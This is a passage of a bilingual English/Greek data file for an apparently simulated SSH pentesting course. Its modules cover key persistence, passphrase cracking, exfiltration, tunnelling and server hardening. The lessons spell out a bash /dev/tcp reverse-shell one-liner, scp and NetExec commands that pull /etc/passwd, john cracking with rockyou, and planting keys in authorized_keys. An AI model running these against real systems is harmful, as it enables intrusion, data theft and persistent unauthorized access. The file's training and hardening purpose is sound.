          el: "Αν αποκτήσεις ένα ιδιωτικό κλειδί, το 'ssh -i id_rsa pentest@host' συνδέεται χωρίς κωδικό. Ένα κλειδί πρέπει να έχει αυστηρά δικαιώματα ('chmod 600 id_rsa') αλλιώς το SSH αρνείται να το χρησιμοποιήσει.",
        },
      },
      {
        heading: { en: "Cracking a key passphrase", el: "Σπάσιμο passphrase κλειδιού" },
        body: {
          en: "A passphrase-protected key is useless to a thief without the passphrase — unless it's weak. 'ssh2john id_rsa > hash' converts the key to a crackable format, then 'john' tries a wordlist. A trivial passphrase like '123' falls even against a strong Bcrypt KDF.",
          el: "Ένα κλειδί με passphrase είναι άχρηστο για κλέφτη χωρίς το passphrase — εκτός αν είναι αδύναμο. Το 'ssh2john id_rsa > hash' μετατρέπει το κλειδί σε crackable μορφή, μετά το 'john' δοκιμάζει wordlist. Ένα τετριμμένο passphrase όπως '123' πέφτει ακόμα και με ισχυρό Bcrypt KDF.",
        },
        tip: {
          en: "Flow: ssh-keygen → cat id_rsa.pub > authorized_keys → ssh2john → john → ssh -i id_rsa.",
          el: "Ροή: ssh-keygen → cat id_rsa.pub > authorized_keys → ssh2john → john → ssh -i id_rsa.",
        },
      },
    ],
    cheats: [
      { cmd: "ssh-keygen", desc: { en: "generate a keypair", el: "δημιουργία ζεύγους" } },
      { cmd: "cat id_rsa.pub > authorized_keys", desc: { en: "trust the key", el: "εμπιστοσύνη κλειδιού" } },
      { cmd: "ssh2john id_rsa > hash", desc: { en: "key → hash", el: "κλειδί → hash" } },
      { cmd: "john -w=rockyou.txt hash", desc: { en: "crack passphrase", el: "σπάσε passphrase" } },
      { cmd: "chmod 600 id_rsa ; ssh -i id_rsa pentest@<ip>", desc: { en: "key login", el: "σύνδεση με κλειδί" } },
    ],
    tasks: [
      {
        id: "ssh-keygen",
        instruction: { en: "On the target, generate an SSH keypair and authorize it.", el: "Στον στόχο, δημιούργησε ζεύγος κλειδιών SSH και εξουσιοδότησέ το." },
        hint: { en: "ssh-keygen   then   cat id_rsa.pub > authorized_keys", el: "ssh-keygen   μετά   cat id_rsa.pub > authorized_keys" },
        explain: {
          en: "WHY: Adding your public key to authorized_keys grants passwordless, persistent access. HOW: run 'ssh-keygen', then 'cat id_rsa.pub > authorized_keys' in ~/.ssh.",
          el: "ΓΙΑΤΙ: Προσθέτοντας το δημόσιο κλειδί στο authorized_keys αποκτάς μόνιμη πρόσβαση χωρίς κωδικό. ΠΩΣ: τρέξε 'ssh-keygen', μετά 'cat id_rsa.pub > authorized_keys' στο ~/.ssh.",
        },
        check: (s) => s.keyGenerated && s.authorizedKeysSet,
      },
      {
        id: "ssh-crack-key",
        instruction: { en: "Crack a passphrase-protected private key offline (ssh2john + john).", el: "Σπάσε offline ένα ιδιωτικό κλειδί με passphrase (ssh2john + john)." },
        hint: { en: "ssh2john id_rsa > hash   then   john -w=rockyou.txt hash", el: "ssh2john id_rsa > hash   μετά   john -w=rockyou.txt hash" },
        explain: {
          en: "WHY: A stolen key with a weak passphrase is crackable offline. HOW: 'ssh2john id_rsa > hash' converts it, then 'john -w=rockyou.txt hash' recovers the passphrase '123'.",
          el: "ΓΙΑΤΙ: Ένα κλεμμένο κλειδί με αδύναμο passphrase σπάει offline. ΠΩΣ: 'ssh2john id_rsa > hash' το μετατρέπει, μετά 'john -w=rockyou.txt hash' ανακτά το passphrase '123'.",
        },
        check: (s) => s.keyCracked,
      },
    ],
    challenges: [
      {
        title: { en: "Crack & Capture", el: "Σπάσε & Άρπαξε" },
        brief: {
          en: "Turn a stolen key into access: extract its hash, crack the passphrase with a wordlist, and capture the key flag.",
          el: "Μετέτρεψε ένα κλεμμένο κλειδί σε πρόσβαση: εξάγαγε το hash, σπάσε το passphrase με wordlist και άρπαξε το flag κλειδιού.",
        },
        success: { en: "Passphrase recovered — the key is now yours to use.", el: "Το passphrase ανακτήθηκε — το κλειδί είναι δικό σου." },
        check: (s) => s.keyCracked && s.has(SSH_FLAGS.keys),
      },
      {
        title: { en: "Log In With the Key", el: "Σύνδεση με το Κλειδί" },
        brief: {
          en: "Finish the job: fix the key's permissions and authenticate with the private key instead of a password.",
          el: "Ολοκλήρωσε: διόρθωσε τα δικαιώματα του κλειδιού και συνδέσου με το ιδιωτικό κλειδί αντί για κωδικό.",
        },
        success: { en: "Key-based login succeeded — persistent, password-independent access.", el: "Σύνδεση με κλειδί πέτυχε — μόνιμη πρόσβαση ανεξάρτητη κωδικού." },
        check: (s) => s.keyLogin,
      },
    ],
  },

  // 7 — DATA EXFILTRATION
  {
    id: "ssh-exfil",
    order: 7,
    icon: "folder",
    color: "from-sky-500 to-blue-600",
    difficulty: 3,
    tool: "terminal",
    title: { en: "Data Exfiltration", el: "Εξαγωγή Δεδομένων" },
    subtitle: { en: "SCP & NetExec file operations", el: "Λειτουργίες αρχείων SCP & NetExec" },
    badge: { en: "Data Thief", el: "Κλέφτης Δεδομένων" },
    sshInit: seedShell,
    theory: [
      {
        heading: { en: "SSH is a file channel too", el: "Το SSH είναι και κανάλι αρχείων" },
        body: {
          en: "An authenticated SSH session is far more than a shell — it is a secure file-transfer channel. SCP (Secure Copy) rides on SSH's encryption to move files in either direction between attacker and target.",
          el: "Μια authenticated συνεδρία SSH είναι πολύ περισσότερα από shell — είναι ασφαλές κανάλι μεταφοράς αρχείων. Το SCP (Secure Copy) χρησιμοποιεί την κρυπτογράφηση του SSH για να μετακινεί αρχεία προς κάθε κατεύθυνση.",
        },
      },
      {
        heading: { en: "Download & upload with SCP", el: "Λήψη & αποστολή με SCP" },
        body: {
          en: "Pull sensitive data to Kali with 'scp pentest@host:/etc/passwd .'. Reverse the arguments to push tools or payloads onto the target: 'scp tool.sh pentest@host:/tmp/'. /etc/passwd alone leaks every username, UID and home directory on the box.",
          el: "Τράβα ευαίσθητα δεδομένα στο Kali με 'scp pentest@host:/etc/passwd .'. Αντίστρεψε τα ορίσματα για να ανεβάσεις εργαλεία ή payloads: 'scp tool.sh pentest@host:/tmp/'. Μόνο το /etc/passwd διαρρέει κάθε όνομα χρήστη, UID και home στον server.",
        },
      },
      {
        heading: { en: "NetExec file operations", el: "Λειτουργίες αρχείων NetExec" },
        body: {
          en: "NetExec can transfer files over an authenticated SSH connection without opening an interactive shell: '--get-file' downloads from the target and '--put-file' uploads to it. This is handy for fast, scriptable, non-interactive looting.",
          el: "Το NetExec μεταφέρει αρχεία πάνω από authenticated SSH χωρίς διαδραστικό shell: το '--get-file' κατεβάζει από τον στόχο και το '--put-file' ανεβάζει. Χρήσιμο για γρήγορη, scriptable, μη διαδραστική λεηλασία.",
        },
        tip: {
          en: "Exfil expands the blast radius: an SSH foothold alone lets you steal and plant files.",
          el: "Η εξαγωγή διευρύνει την εμβέλεια: μόνο ένα πάτημα SSH σου επιτρέπει να κλέβεις και να φυτεύεις αρχεία.",
        },
      },
    ],
    cheats: [
      { cmd: "scp pentest@<ip>:/etc/passwd .", desc: { en: "download a file", el: "λήψη αρχείου" } },
      { cmd: "scp file pentest@<ip>:/tmp/", desc: { en: "upload a file", el: "αποστολή αρχείου" } },
      { cmd: "nxc ssh <ip> -u pentest -p 123 --get-file /etc/passwd passwd", desc: { en: "NetExec download", el: "λήψη NetExec" } },
      { cmd: "nxc ssh <ip> -u pentest -p 123 --put-file file /tmp/file", desc: { en: "NetExec upload", el: "αποστολή NetExec" } },
    ],
    tasks: [
      {
        id: "ssh-scp",
        instruction: { en: "Exfiltrate /etc/passwd from the target with SCP.", el: "Εξάγαγε το /etc/passwd από τον στόχο με SCP." },
        hint: { en: "scp pentest@192.168.1.9:/etc/passwd .", el: "scp pentest@192.168.1.9:/etc/passwd ." },
        explain: {
          en: "WHY: /etc/passwd lists every account; SCP proves SSH is a data channel. HOW: 'scp pentest@192.168.1.9:/etc/passwd .' copies it to Kali.",
          el: "ΓΙΑΤΙ: Το /etc/passwd δείχνει κάθε λογαριασμό· το SCP αποδεικνύει ότι το SSH είναι κανάλι δεδομένων. ΠΩΣ: 'scp pentest@192.168.1.9:/etc/passwd .' το αντιγράφει στο Kali.",
        },
        check: (s) => s.scpDownload,
      },
      {
        id: "ssh-putfile",
        instruction: { en: "Upload a file to the target (SCP or NetExec --put-file).", el: "Ανέβασε ένα αρχείο στον στόχο (SCP ή NetExec --put-file)." },
        hint: { en: "scp file.txt pentest@192.168.1.9:/tmp/   or   nxc ssh 192.168.1.9 -u pentest -p 123 --put-file file.txt /tmp/file.txt", el: "scp file.txt pentest@192.168.1.9:/tmp/   ή   nxc ssh 192.168.1.9 -u pentest -p 123 --put-file file.txt /tmp/file.txt" },
        explain: {
          en: "WHY: Attackers plant tools/payloads, not just steal data. HOW: push a file with 'scp file pentest@host:/tmp/' or NetExec's '--put-file'.",
          el: "ΓΙΑΤΙ: Οι επιτιθέμενοι φυτεύουν εργαλεία/payloads, δεν κλέβουν μόνο. ΠΩΣ: ανέβασε αρχείο με 'scp file pentest@host:/tmp/' ή με '--put-file' του NetExec.",
        },
        check: (s) => s.scpUpload,
      },
    ],
    challenges: [
      {
        title: { en: "Two-Way Transfer", el: "Αμφίδρομη Μεταφορά" },
        brief: {
          en: "Demonstrate full file control over SSH: both exfiltrate a sensitive file from the target AND plant a file onto it, capturing the exfiltration flag.",
          el: "Δείξε πλήρη έλεγχο αρχείων μέσω SSH: εξάγαγε ένα ευαίσθητο αρχείο ΚΑΙ φύτεψε ένα αρχείο στον στόχο, παίρνοντας το flag εξαγωγής.",
        },
        success: { en: "Data pulled and tools planted — the SSH foothold is a full file bridge.", el: "Δεδομένα τραβήχτηκαν και εργαλεία φυτεύτηκαν — το πάτημα SSH είναι πλήρης γέφυρα αρχείων." },
        check: (s) => s.scpDownload && s.scpUpload && s.has(SSH_FLAGS.exfil),
      },
      {
        title: { en: "Loot Without a Shell", el: "Λεηλασία Χωρίς Shell" },
        brief: {
          en: "Prove you can transfer files non-interactively. Use NetExec to download a file from the target without ever opening an interactive session.",
          el: "Απόδειξε ότι μεταφέρεις αρχεία μη διαδραστικά. Χρησιμοποίησε το NetExec για να κατεβάσεις ένα αρχείο χωρίς διαδραστική συνεδρία.",
        },
        success: { en: "NetExec file download succeeded — fast, scriptable exfiltration.", el: "Λήψη αρχείου με NetExec πέτυχε — γρήγορη, scriptable εξαγωγή." },
        check: (s) => s.netexecGet,
      },
    ],
  },

  // 8 — TUNNELLING & PIVOTING (browser + topology visual)
  {
    id: "ssh-tunnel",
    order: 8,
    icon: "network",
    color: "from-violet-500 to-indigo-600",
    difficulty: 4,
    tool: "both",
    title: { en: "Tunnelling & Pivoting", el: "Tunnelling & Pivoting" },
    subtitle: { en: "Local port forward + reverse shell", el: "Local port forward + reverse shell" },
    badge: { en: "Tunneler", el: "Δημιουργός Σήραγγας" },
    sshInit: seedShell,
    theory: [
      {
        heading: { en: "Reaching internal services", el: "Πρόσβαση σε εσωτερικές υπηρεσίες" },
        body: {
          en: "The target runs a web app bound to 127.0.0.1:8080 — invisible from the network because it only listens on loopback. SSH local port forwarding tunnels it to your machine: 'ssh -L 8080:127.0.0.1:8080 pentest@host'. Now http://localhost:8080 on Kali reaches the internal app.",
          el: "Ο στόχος τρέχει web app δεμένη στο 127.0.0.1:8080 — αόρατη από το δίκτυο γιατί ακούει μόνο στο loopback. Το SSH local port forwarding την σηραγγώνει στο μηχάνημά σου: 'ssh -L 8080:127.0.0.1:8080 pentest@host'. Τώρα το http://localhost:8080 στο Kali φτάνει την εσωτερική εφαρμογή.",
        },
        tip: {
          en: "Use the Topology tab to watch the tunnel form, then the Browser tab to open the app.",
          el: "Δες το Topology για να σχηματιστεί η σήραγγα, μετά το Browser για να ανοίξεις την εφαρμογή.",
        },
      },
      {
        heading: { en: "Reverse shells for pivoting", el: "Reverse shells για pivoting" },
        body: {
          en: "Sometimes you want a raw channel instead of SSH — to evade SSH-specific monitoring or chain further pivots. A bash reverse shell makes the target connect back to a listener you start on Kali ('nc -lvnp 1234'), handing you an interactive prompt from the other direction.",
          el: "Μερικές φορές θες raw κανάλι αντί για SSH — για αποφυγή SSH-specific monitoring ή για αλυσιδωτά pivots. Ένα bash reverse shell κάνει τον στόχο να συνδεθεί πίσω σε έναν listener που ξεκινάς στο Kali ('nc -lvnp 1234'), δίνοντάς σου διαδραστικό prompt από την άλλη κατεύθυνση.",
        },
      },
    ],
    cheats: [
      { cmd: "ssh -L 8080:127.0.0.1:8080 pentest@<ip>", desc: { en: "local port forward", el: "local port forward" } },
      { cmd: "netstat -tlnp", desc: { en: "find internal ports", el: "βρες εσωτερικές θύρες" } },
      { cmd: "nc -lvnp 1234", desc: { en: "start a listener", el: "ξεκίνα listener" } },
      { cmd: "bash -i >& /dev/tcp/<kali>/1234 0>&1", desc: { en: "reverse shell one-liner", el: "reverse shell one-liner" } },
    ],
    tasks: [
      {
        id: "ssh-forward",
        instruction: { en: "Open a local port-forward to the internal app, then load it in the Browser tab.", el: "Άνοιξε local port-forward στην εσωτερική εφαρμογή, μετά φόρτωσέ την στην καρτέλα Browser." },
        hint: { en: "ssh -L 8080:127.0.0.1:8080 pentest@192.168.1.9   →   Browser: http://localhost:8080/", el: "ssh -L 8080:127.0.0.1:8080 pentest@192.168.1.9   →   Browser: http://localhost:8080/" },
        explain: {
          en: "WHY: The app is localhost-only on the target; a tunnel bridges it to you. HOW: 'ssh -L 8080:127.0.0.1:8080 pentest@192.168.1.9', then open http://localhost:8080/ in the Browser tab.",
          el: "ΓΙΑΤΙ: Η εφαρμογή είναι localhost-only στον στόχο· μια σήραγγα τη γεφυρώνει. ΠΩΣ: 'ssh -L 8080:127.0.0.1:8080 pentest@192.168.1.9', μετά άνοιξε http://localhost:8080/ στο Browser.",
        },
        check: (s) => s.tunnelOpen,
      },
      {
        id: "ssh-revshell",
        instruction: { en: "Catch a reverse shell: start a listener, then fire the bash callback.", el: "Πιάσε ένα reverse shell: ξεκίνα listener, μετά πυροδότησε το bash callback." },
        hint: { en: "nc -lvnp 1234   then on target:   bash -i >& /dev/tcp/192.168.1.17/1234 0>&1", el: "nc -lvnp 1234   μετά στον στόχο:   bash -i >& /dev/tcp/192.168.1.17/1234 0>&1" },
        explain: {
          en: "WHY: A raw callback channel evades SSH monitoring and enables pivots. HOW: start 'nc -lvnp 1234' on Kali, then run the bash /dev/tcp one-liner on the target to connect back.",
          el: "ΓΙΑΤΙ: Ένα raw κανάλι callback αποφεύγει το SSH monitoring και επιτρέπει pivots. ΠΩΣ: ξεκίνα 'nc -lvnp 1234' στο Kali, μετά τρέξε το bash /dev/tcp one-liner στον στόχο για να συνδεθεί πίσω.",
        },
        check: (s) => s.reverseShell && s.listenerUp,
      },
    ],
    challenges: [
      {
        title: { en: "Breach the Internal App", el: "Παραβίασε την Εσωτερική Εφαρμογή" },
        brief: {
          en: "A service hides on 127.0.0.1:8080, unreachable from the network. Tunnel through SSH and actually open it in the browser to capture the tunnel flag.",
          el: "Μια υπηρεσία κρύβεται στο 127.0.0.1:8080, απρόσιτη από το δίκτυο. Σηράγγωσε μέσω SSH και άνοιξέ την στον browser για να πάρεις το flag σήραγγας.",
        },
        success: { en: "Internal app reached through the tunnel — pivot successful.", el: "Η εσωτερική εφαρμογή προσπελάστηκε μέσω σήραγγας — pivot επιτυχές." },
        check: (s) => s.tunnelOpen && s.visitedInternal && s.has(SSH_FLAGS.tunnel),
      },
      {
        title: { en: "Out-of-Band Callback", el: "Callback Εκτός Ζώνης" },
        brief: {
          en: "Establish a non-SSH channel: start a listener on Kali and trigger a bash reverse shell from the target so it calls back to you.",
          el: "Δημιούργησε κανάλι εκτός SSH: ξεκίνα listener στο Kali και πυροδότησε bash reverse shell από τον στόχο ώστε να σε καλέσει πίσω.",
        },
        success: { en: "Callback received — you hold a raw interactive shell.", el: "Λήφθηκε callback — κρατάς raw διαδραστικό shell." },
        check: (s) => s.reverseShell && s.listenerUp,
      },
    ],
  },

  // 9 — HARDENING (blue team)
  {
    id: "ssh-harden",
    order: 9,
    icon: "shield",
    color: "from-neon-green to-emerald-600",
    difficulty: 3,
    tool: "terminal",
    title: { en: "Hardening the Server", el: "Θωράκιση του Server" },
    subtitle: { en: "Shut down the attack you just ran", el: "Κλείσε την επίθεση που μόλις έκανες" },
    badge: { en: "Defender", el: "Αμυνόμενος" },
    sshInit: (t) => {
      seedShell(t);
      t.s.remoteUser = "root";
      t.cwd = "/etc/ssh";
    },
    theory: [
      {
        heading: { en: "Think like the blue team", el: "Σκέψου σαν blue team" },
        body: {
          en: "Every attack in this campaign traced back to one weak password. The fix is defence-in-depth, configured in /etc/ssh/sshd_config. In this lab you apply directives with a safe 'harden' helper and re-scan to verify the effect.",
          el: "Κάθε επίθεση σε αυτή την καμπάνια προήλθε από έναν αδύναμο κωδικό. Η λύση είναι defence-in-depth, στο /etc/ssh/sshd_config. Εδώ εφαρμόζεις directives με τον ασφαλή βοηθό 'harden' και ξανασαρώνεις για επαλήθευση.",
        },
      },
      {
        heading: { en: "Move the port (noise reduction)", el: "Άλλαξε τη θύρα (μείωση θορύβου)" },
        body: {
          en: "Changing 'Port 22' to a non-standard port (e.g. 2222) hides SSH from lazy scanners and botnets. It is NOT real security — a full nmap scan still finds it — but it cuts automated noise. Apply it, then confirm port 22 is now closed.",
          el: "Η αλλαγή 'Port 22' σε μη τυπική θύρα (π.χ. 2222) κρύβει το SSH από τεμπέληδες scanners και botnets. ΔΕΝ είναι πραγματική ασφάλεια — μια πλήρης σάρωση nmap το βρίσκει — αλλά μειώνει τον αυτόματο θόρυβο. Εφάρμοσέ το και επιβεβαίωσε ότι η θύρα 22 είναι κλειστή.",
        },
      },
      {
        heading: { en: "Disable password auth (the real fix)", el: "Απενεργοποίησε password auth (η πραγματική λύση)" },
        body: {
          en: "Setting 'PasswordAuthentication no' eliminates the entire remote brute-force attack surface — Hydra fails at the protocol level. Combined with key-only access, strong key passphrases, and no TCP forwarding, the whole attack chain collapses.",
          el: "Το 'PasswordAuthentication no' εξαλείφει όλη την επιφάνεια brute-force — το Hydra αποτυγχάνει σε επίπεδο πρωτοκόλλου. Μαζί με key-only πρόσβαση, ισχυρά passphrases και χωρίς TCP forwarding, όλη η αλυσίδα επίθεσης καταρρέει.",
        },
        tip: {
          en: "After disabling passwords, re-run the auth-methods scan: only 'publickey' should remain.",
          el: "Μετά την απενεργοποίηση κωδικών, ξανατρέξε τη σάρωση auth-methods: πρέπει να μείνει μόνο 'publickey'.",
        },
      },
    ],
    cheats: [
      { cmd: "harden port 2222", desc: { en: "move SSH off :22", el: "μετακίνηση SSH από :22" } },
      { cmd: "harden passwordauth no", desc: { en: "disable password login", el: "απενεργοποίηση κωδικών" } },
      { cmd: "nmap --script ssh-auth-methods -p 22 <ip>", desc: { en: "verify only publickey", el: "επιβεβαίωση μόνο publickey" } },
      { cmd: "hydra ... ssh", desc: { en: "confirm brute-force fails", el: "επιβεβαίωση αποτυχίας brute-force" } },
    ],
    tasks: [
      {
        id: "ssh-port",
        instruction: { en: "Move SSH off the default port 22.", el: "Μετακίνησε το SSH από την προεπιλεγμένη θύρα 22." },
        hint: { en: "harden port 2222", el: "harden port 2222" },
        explain: {
          en: "WHY: A non-standard port cuts automated scanner noise (not a real defence alone). HOW: in this lab, 'harden port 2222' edits sshd_config and restarts the service.",
          el: "ΓΙΑΤΙ: Μη τυπική θύρα μειώνει τον θόρυβο scanners (όχι πραγματική άμυνα μόνη της). ΠΩΣ: εδώ, 'harden port 2222' επεξεργάζεται το sshd_config και επανεκκινεί την υπηρεσία.",
        },
        check: (s) => s.portChanged,
      },
      {
        id: "ssh-nopass",
        instruction: { en: "Disable password authentication to kill remote brute-force.", el: "Απενεργοποίησε το password auth για να σταματήσεις το brute-force." },
        hint: { en: "harden passwordauth no", el: "harden passwordauth no" },
        explain: {
          en: "WHY: Key-only auth removes the remote brute-force surface entirely. HOW: 'harden passwordauth no' sets PasswordAuthentication no in sshd_config.",
          el: "ΓΙΑΤΙ: Το key-only auth αφαιρεί εντελώς την επιφάνεια brute-force. ΠΩΣ: 'harden passwordauth no' θέτει PasswordAuthentication no στο sshd_config.",
        },
        check: (s) => s.passwordAuthDisabled,
      },
    ],
    challenges: [
      {
        title: { en: "Lock It Down", el: "Κλείδωσέ το" },
        brief: {
          en: "Harden the server so it is key-only, then PROVE the fix: after disabling password auth, re-enumerate the authentication methods and confirm only publickey remains.",
          el: "Θωράκισε τον server ώστε να είναι key-only, μετά ΑΠΟΔΕΙΞΕ τη διόρθωση: αφού απενεργοποιήσεις το password auth, ξανα-απαρίθμησε τις μεθόδους auth και επιβεβαίωσε ότι μένει μόνο publickey.",
        },
        success: { en: "Key-only enforced and verified — the brute-force door is shut.", el: "Key-only επιβλήθηκε και επαληθεύτηκε — η πόρτα brute-force έκλεισε." },
        check: (s) => s.passwordAuthDisabled && s.authEnum && s.has(SSH_FLAGS.harden),
      },
      {
        title: { en: "Prove Brute-Force Now Fails", el: "Απόδειξε ότι το Brute-Force Αποτυγχάνει" },
        brief: {
          en: "The ultimate verification: with password auth disabled, launch a brute-force attempt against SSH and observe it being rejected at the protocol level.",
          el: "Η τελική επαλήθευση: με απενεργοποιημένο password auth, εξαπόλυσε brute-force στο SSH και δες το να απορρίπτεται σε επίπεδο πρωτοκόλλου.",
        },
        success: { en: "Hydra rejected — the hardening holds. Engagement complete. 🛡", el: "Το Hydra απορρίφθηκε — η θωράκιση κρατά. Ολοκλήρωση. 🛡" },
        check: (s) => s.passwordAuthDisabled,
      },
    ],
  },
];
